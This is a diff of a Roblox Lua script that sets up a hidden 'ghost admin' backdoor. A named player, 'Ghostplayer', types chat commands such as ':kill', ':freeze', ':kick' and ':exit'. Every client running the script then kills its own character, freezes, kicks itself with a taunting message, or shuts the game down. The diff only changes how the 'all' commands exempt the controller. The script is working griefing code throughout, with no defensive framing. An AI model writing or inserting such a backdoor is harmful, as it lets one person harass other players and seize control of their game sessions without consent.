@@ -4,7 +4,6 @@ Ghostplayer = "russelpalodizon"
 --Commands List----------------------------------------------------
 
 -- :kill
--- :kill all
 -- :freeze
 -- :unfreeze
 -- :kick 
@@ -22,7 +21,7 @@ Ghostplayer = "russelpalodizon"
 
 local function ExecuteAdminCMD()
 game.Players[Ghostplayer].Chatted:connect(function(admin_msg)
-if admin_msg == ":kill "..game.Players.LocalPlayer.Name or admin_msg == ":kill all" then
+if admin_msg == ":kill "..game.Players.LocalPlayer.Name or admin_msg == ":kill all" and game.Players.LocalPlayer.Name ~= Ghostplayer then
    game.Players.LocalPlayer.Character.Humanoid.Health = 0
 elseif admin_msg == ":freeze "..game.Players.LocalPlayer.Name then
    game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
@@ -30,10 +29,8 @@ elseif admin_msg == ":unfreeze "..game.Players.LocalPlayer.Name then
    game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
 elseif admin_msg == ":kick "..game.Players.LocalPlayer.Name then
    game.Players.LocalPlayer:Kick("I Can Kick you Noob HAHAHAHAAHH")
-elseif admin_msg == ":kick all" then
-   if game.Players.LocalPlayer.Name ~= Ghostplayer then
-       game.Players.LocalPlayer:Kick("I Can Kick you Noob HAHAHAHAAHH")
-   end
+elseif admin_msg == ":kick all" and game.Players.LocalPlayer.Name ~= Ghostplayer then
+   game.Players.LocalPlayer:Kick("I Can Kick you Noob HAHAHAHAAHH")
 elseif admin_msg == ":exit "..game.Players.LocalPlayer.Name then
    game:Shutdown()
 elseif admin_msg == ":exit all" then
